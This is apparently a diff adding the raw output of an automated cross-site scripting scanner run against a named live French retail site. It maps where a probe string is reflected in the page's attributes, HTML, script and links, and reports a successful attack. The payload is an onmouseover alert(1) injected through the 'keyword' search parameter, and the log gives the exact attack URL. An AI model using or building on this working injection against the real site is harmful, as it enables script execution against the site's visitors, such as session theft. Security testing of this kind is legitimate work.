@@ -1,0 +1,134 @@
+https://fr.pandahall.com
+
+GET Params:[2]
+['keyword', 'ph_source_from']
+_______________________________________________________________________________________________________
+https://fr.pandahall.com/ProductSearch?keyword=(uvw"xyz'yxz</zxy&ph_source_from=advanced_search
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input type="text" autocomplete="off" id="searchProduct" name="keyword" class="search_input" maxlength="200" value='(uvw&#034;xyz&#039;yxz&lt;/zxy' placeholder="Rechercher dans 600,000 + Produits" style="border-right:none;" />
+<input type="hidden" id="searchKeyword" value="(uvw&quot;xyz'yxz&lt;/zxy" />
+
+----------------------------------------------------------------------------------
+HTML Context: [2]
+<title>Trouver achat en gros (uvw&#034;xyz&#039;yxz&lt;/zxy à bas prix dans - Fr.Pandahall.com
+      </title>
+<span style="color: #df8402; word-wrap: break-word;">(uvw&#034;xyz&#039;yxz&lt;/zxy</span>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script>
+		!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+		n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+		n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+		t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+		document,'script','//connect.facebook.net/en_US/fbevents.js');
+		 
+		fbq('init', '262157083985649');
+		fbq('track', "PageView");
+		
+			fbq('track', 'Search', { 
+			  search_string: '(uvw&quot;xyz'yxz&lt;/zxy',
+			  content_ids: [], // top 5-10 search results
+			  content_type: 'product'
+			});
+		</script>
+
+----------------------------------------------------------------------------------
+URI Context: [7]
+<a href="https://fr.pandahall.com/ProductSearch?keyword=%28uvw%22xyz%27yxz%3C%2Fzxy" class="searchKeywordSpan">
+<a href="https://fr.pandahall.com/ProductSearch?keyword=%28uvw%22xyz'yxz%3C/zxy&page=1">
+<a href="https://fr.pandahall.com/ProductSearch?keyword=%28uvw%22xyz'yxz%3C/zxy&page=1&batchType=1">
+<a href="https://fr.pandahall.com/ProductSearch?keyword=%28uvw%22xyz'yxz%3C/zxy&page=1&batchType=2">
+<a href="https://fr.pandahall.com/ProductSearch?keyword=%28uvw%22xyz'yxz%3C/zxy&page=1&batchType=3">
+<meta name="keywords" content="(uvw&#034;xyz&#039;yxz&lt;/zxy  en gros, achat (uvw&#034;xyz&#039;yxz&lt;/zxy pas cher, boutique de (uvw&#034;xyz&#039;yxz&lt;/zxy  en ligne, (uvw&#034;xyz&#039;yxz&lt;/zxy pour création de bijoux, France métropolitaine, Canada, Belgique, Suisse, Polynésie française, Réunion, Guadeloupe, Martinique, Nouvelle-Calédonie" />
+<meta name="description" content="Comme grossiste en  (uvw&#034;xyz&#039;yxz&lt;/zxy  , Fr.Pandahall.com vous offre de  (uvw&#034;xyz&#039;yxz&lt;/zxy  à prix très bas, nous acceuillons tous les achats de (uvw&#034;xyz&#039;yxz&lt;/zxy  en gros ou en vrac." />
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	False
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://fr.pandahall.com/ProductSearch?keyword=' onmouseover='alert(1)&ph_source_from=advanced_search
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input type="hidden" id="searchKeyword" value="' onmouseover='alert(1)" />
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	False
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+https://fr.pandahall.com/ProductSearch?keyword=&ph_source_from=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
